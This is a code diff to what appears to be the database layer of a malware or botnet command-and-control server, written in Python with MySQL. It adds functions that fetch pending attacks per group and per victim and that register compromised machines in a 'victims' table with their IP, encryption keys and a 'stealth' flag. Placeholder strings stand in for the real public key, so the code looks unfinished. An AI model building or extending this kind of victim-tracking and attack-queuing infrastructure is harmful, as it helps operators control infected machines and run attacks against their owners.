@@ -1,6 +1,23 @@
 import mysql.connector
 from env import *
 
+import argparse
+import os
+import json
+import socket
+import select
+import threading
+import rsa
+import base64
+
+from database import *
+from network import *
+from functions import *
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
+from queue import Queue, Empty
+
 # Database
 db = mysql.connector.connect(
     host=DBHOST,
@@ -49,3 +66,52 @@ def get_group_of(id = None, uid = None):
         return None
     else:
         return groups
+    
+
+
+def get_group_attacks(mycursor):
+    # state = "pending", "running", "finished", "error"
+    query = "SELECT * FROM group_attacks WHERE state = 'pending';"
+
+    mycursor.execute(query)
+    attacks = mycursor.fetchall()
+
+    return attacks
+
+
+def get_victim_attacks(mycursor):
+    # state = "pending", "running", "finished", "error"
+    query = "SELECT * FROM victim_attacks WHERE state = 'pending';"
+
+    mycursor.execute(query)
+    attacks = mycursor.fetchall()
+
+    return attacks
+
+
+def add_victim_to_db(db, mycursor, uid, ip, sym_key, pub_key):
+    # Vérification de l'uid dans la base de données
+    query = "SELECT * FROM victims WHERE uid = %s"
+    values = (uid,)
+
+    mycursor.execute(query, values)
+
+    myresult = mycursor.fetchall()
+
+    #Update du client en bdd
+    if len(myresult) > 0:
+        # print("client already in the database")
+        query = "UPDATE victims SET ip = %s, sym_key = %s, pub_key = %s WHERE uid = %s"
+        values = (ip, base64.b64encode(sym_key).decode(), base64.b64encode("testupdated".encode()).decode(), uid)
+
+        mycursor.execute(query, values)
+
+    #Insert du client en bdd
+    else:
+        # print("client not in the database")
+        query = "INSERT INTO victims (uid, ip, sym_key, pub_key, stealth, multi_thread) VALUES (%s, %s, %s, %s, %s, %s)"
+        values = (uid, ip, base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)
+
+        mycursor.execute(query, values)
+
+    db.commit()
